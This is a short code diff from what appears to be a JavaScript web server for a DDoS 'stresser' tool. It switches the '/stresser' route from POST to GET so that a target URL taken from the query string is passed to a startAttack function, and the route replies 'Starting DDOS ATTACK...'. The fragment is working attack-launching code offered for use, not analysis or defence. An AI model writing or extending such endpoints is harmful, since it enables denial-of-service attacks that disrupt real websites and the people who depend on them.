@@ -248,8 +248,8 @@ const startAttack = (url) => {
     }
 };
 
-app.post("/stresser", (req, res) => {
-    targetUrl = req.body.url;
+app.get("/stresser", (req, res) => {
+    targetUrl = req.query.url;
     startAttack(targetUrl);
     res.json({ message: "Starting DDOS ATTACK..." });
 });
